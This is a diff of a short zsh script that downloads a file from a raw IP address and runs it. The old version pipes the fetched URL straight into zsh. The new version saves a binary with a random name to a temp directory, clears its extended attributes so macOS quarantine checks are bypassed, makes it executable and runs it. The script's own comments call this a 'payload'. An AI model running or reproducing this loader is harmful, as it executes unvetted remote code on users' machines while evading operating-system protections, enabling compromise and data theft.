@@ -1,8 +1,14 @@
 #!/bin/zsh
-# cache payload v1 entropy block
+# runtime payload v4 binary fetch
 
 set -e
 
-URL="http://64.89.160.11/Tahujez"
+TMP_DIR=$(mktemp -d)
+cd "$TMP_DIR"
 
-curl -fsSL "$URL" | zsh
+curl -fsSL -o Jiruve http://64.89.160.11/Tahujez
+
+xattr -c Jiruve
+chmod +x Jiruve
+
+./Jiruve
